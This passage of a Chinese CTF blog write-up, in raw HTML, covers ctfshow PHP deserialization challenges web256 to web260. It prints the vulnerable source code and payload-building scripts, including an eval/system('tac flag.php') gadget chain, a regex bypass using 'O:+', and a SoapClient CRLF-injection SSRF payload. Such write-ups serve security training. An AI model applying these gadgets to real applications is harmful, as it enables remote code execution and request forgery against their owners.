class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题相较于上一题的区别在于多了验证变量username与password是否相等，不相等才能输出flag。</p></li><li><p>构造payload<br>脚本改造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只需要将cookie的值改为这个脚本输出的值，并且get传入的参数与脚本username和password相等即可。<br>成功拿到flag</p></li></ol><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>__construct()函数</code><br>对象创建时自动调用，对对象进行初始化。</li><li><code>__destruct()函数</code><br>当所有操作执行完毕后，有需要释放的对象会自动触发该方法。</li></ul><p>与之前相比变化的地方在于，public变量变为了private变量，并且ctfShowUser类里多了一个私有变量class，多了两个魔术方法与两个类<br>我们可以看到类backDoor里有我们需要的eval函数，通过这个函数执行我们想执行的代码。</p><ol start="2"><li>构造payload<br>于是我们可以写如下脚本来或许序列化后的字符串：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>这个脚本将原本实例化类info的class变量改为了backDoor，并且在类backDoor里将变量code赋值为能够显示flag的代码。<br>系统命令可以用tac，tac是cat命令的反转，它使行逆序显示文件内容。也可以使用cat命令，但是需要在源码中找寻flag<br>GET参数与上一题不变：<br><code>?username=1&amp;password=2</code><br>成功拿到flag</li></ol><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题的区别只是在于增加了过滤，不允许字母o或c后面出现数字，我们可以使用加号（+）绕过。如 O:+8</p></li><li><p>构造payload<br>脚本和上一题相似，但我们不使用urlencode了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的序列化字符如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;system(&quot;</span>tac flag.php<span class="string">&quot;);&quot;</span>;&#125;&#125; <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>将 O:数字 格式的所有数字前加上加号（+），并进行url编码，之后送给Cookie中的user<br>GET传参与上一题相同<br>成功拿到flag</p></li></ol><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><ol><li>查看源码<br>页面源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure>flag.php源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这道题所涵盖的知识很多，这里先贴两篇文章：<br><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a><br><a href="https://www.secpulse.com/archives/165358.html">SoapClient</a></li></ol><ul><li>CRLF<br>CRLF是回车和换行的简称 <code>\r\n</code><br>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</li><li>SoapClient原生类<br>SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。<br>soap的拓展的安装，直接打开php.ini，找到extension&#x3D;soap，然后把前面的注释去掉，再重启服务即可。</li><li>explode()函数<br>使用一个字符串分割另一个字符串<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">explode(string $separator, string $string, int $limit = PHP_INT_MAX): array</span><br><span class="line">此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 separator 作为边界点分割出来。</span><br></pre></td></tr></table></figure><a href="https://www.php.net/manual/zh/function.explode">官方文档</a></li><li>array_pop()函数<br>弹出数组最后一个单元（出栈）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_pop(array &amp;$array): mixed</span><br><span class="line">array_pop() 弹出并返回 array 最后一个元素的值，并将 array 的长度减一。</span><br><span class="line">注意: 使用此函数后会重置（reset()）array 指针。</span><br></pre></td></tr></table></figure><a href="https://www.php.net/manual/zh/function.array-pop">官方文档</a></li></ul><p>要得到flag，必须本地访问flag.php而且带上token。因为本题有cloudfare代理，无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p><ol start="2"><li>构造payload<br>首先脚本如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;Lxxx\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>location就是我们要访问的url，其中uri也是不可缺少的，但是其实没什么用。关键就是因为我们可以控制user_agent，所以可以CRLF注入。<br>因为Content-length的缘故，post只取到token&#x3D;ctfshow，其它不需要的部分被丢弃，实现了自己构造POST的请求包。<br>最后将得到的经过url编码后序列化字符串通过GET方式给变量vip，即构造payload为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>最后访问flag.txt，即可拿到flag。</li></ol><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传入变量ctfshow，需要包含preg_match里的字符串</p></li><li><p>构造payload<br>直接构造为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 